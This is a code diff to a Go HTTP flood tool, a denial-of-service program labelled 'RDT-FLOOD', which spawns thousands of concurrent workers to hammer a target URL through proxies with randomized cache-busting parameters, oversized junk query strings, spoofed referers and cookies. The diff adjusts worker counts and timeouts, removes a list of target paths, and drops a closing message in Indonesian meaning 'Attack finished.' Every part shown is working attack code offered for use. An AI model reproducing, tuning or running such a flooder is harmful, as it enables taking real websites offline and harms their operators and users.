@@ -22,7 +22,7 @@ import (
 )
 
 const (
-	wrk        = 2000
+	wrk        = 1500
 	to         = 6 * time.Second
 	sub        = 5
 	KEEP_ALIVE = 30 * time.Second
@@ -130,18 +130,6 @@ var REF = []string{
 	"https://www.yahoo.com/search?p=",
 	"https://www.duckduckgo.com/?q=",
 }
-var PATH_POOL = []string{
-	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
-	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
-	"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
-	"/search", "/category/", "/tag/", "/feed/", "/comment/",
-	"/user/", "/profile/", "/dashboard", "/settings", "/logout",
-	"/login", "/register", "/forgot-password", "/reset-password",
-	"/product", "/products", "/category/products", "/shop",
-	"/cart", "/checkout", "/payment", "/success", "/cancel",
-	"/blog", "/post", "/article", "/news", "/event",
-	"/contact", "/about", "/team", "/career", "/faq",
-}
 
 type CLI struct {
 	client *http.Client
@@ -238,8 +226,8 @@ func main() {
 			},
 			ForceAttemptHTTP2:     true,
 			DisableCompression:    false,
-			TLSHandshakeTimeout:   5 * time.Second,
-			ResponseHeaderTimeout: 5 * time.Second,
+			TLSHandshakeTimeout:   4 * time.Second,
+			ResponseHeaderTimeout: 4 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
 		}
 		ip := ""
@@ -257,12 +245,12 @@ func main() {
 	}
 
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-	fmt.Printf("ޗ | Method : RDT-FLOOD (GET)\n")
+	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
 	fmt.Printf("ޗ | Ulimit : 1048576\n")
 	fmt.Printf("ޗ | Target : %s\n", tgt)
 	fmt.Printf("ޗ | Time   : %d s\n", dur)
 	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d (workers) x %d (sub) = %d goroutines\n", wrk, sub, wrk*sub)
+	fmt.Printf("ޗ | Conc   : %d + %d + %d\n", wrk, sub, wrk*sub)
 	if customCookie != "" {
 		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
 	} else {
@@ -296,8 +284,7 @@ func main() {
 					for ctx.Err() == nil {
 						prof := profiles[subRng.Intn(len(profiles))]
 
-						path := PATH_POOL[subRng.Intn(len(PATH_POOL))]
-						reqURL := tgt + path
+						reqURL := tgt
 
 						param := CBP[subRng.Intn(len(CBP))]
 						if strings.Contains(reqURL, "?") {
@@ -307,7 +294,7 @@ func main() {
 						}
 
 						if subRng.Intn(5) == 0 {
-							reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
+							reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(2024))
 						}
 						if subRng.Intn(10) == 0 {
 							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
@@ -386,6 +373,9 @@ func main() {
 						if err == nil {
 							io.Copy(io.Discard, resp.Body)
 							resp.Body.Close()
+						} else {
+							if subRng.Intn(1000) == 0 {
+							}
 						}
 					}
 				}(s)
@@ -402,5 +392,4 @@ func main() {
 	case <-ctx.Done():
 	}
 	wg.Wait()
-	fmt.Println("\nSerangan selesai.")
 }
